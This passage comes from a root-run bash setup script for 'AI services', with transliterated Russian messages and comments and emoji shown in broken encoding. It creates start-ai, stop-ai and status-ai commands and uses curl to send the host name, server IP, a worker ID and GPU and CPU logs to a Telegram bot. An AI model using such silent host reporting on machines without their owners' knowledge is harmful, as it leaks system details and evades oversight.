‚öôÔ∏è AI Data: \${CPU_STATUS}

GPU logs:
<code>\${GPU_LOGS}</code>

CPU logs:
<code>\${CPU_LOGS}</code>"

curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \\
    -d "chat_id=${TELEGRAM_CHAT_ID}" \\
    -d "text=\${MESSAGE}" \\
    -d "parse_mode=HTML" > /dev/null 2>&1

echo ""
echo "Status otpravlen v Telegram"
EOF
    chmod +x "/usr/local/bin/status-ai"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Vse instrumenty upravleniya sozdany"
    send_telegram_notification "‚úÖ Instrumenty upravleniya sozdany na ${HOSTNAME_VAR}

Komandy: start-ai, stop-ai, status-ai"
    
    return 0
}

#==============================================================================
# –ì–õ–ê–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø
#==============================================================================
main() {
    echo_t "======================================================================="
    echo_t "  Sistemnyy skript dlya upravleniya AI-servisami"
    echo_t "  Zapushchen: $(date '+%Y-%m-%d %H:%M:%S')"
    echo_t "  Khost: ${HOSTNAME_VAR}"
    echo_t "======================================================================="
    echo ""
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ root
    if [ "$EUID" -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Skript dolzhen byt' zapushchen s pravami root"
        exit 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úì Proverka prav root proydena"
    echo ""
    
    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
    install_dependencies
    echo ""
    
    # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ
    send_telegram_notification "üîÑ <b>Nachalo ustanovki AI-infrastruktury</b>

Khost: ${HOSTNAME_VAR}
IP: ${SERVER_IP}
Worker ID: ${WORKER_NAME}
Vremya: $(date '+%Y-%m-%d %H:%M:%S')"
    
    echo_t "[$(date '+%Y-%m-%d %H:%
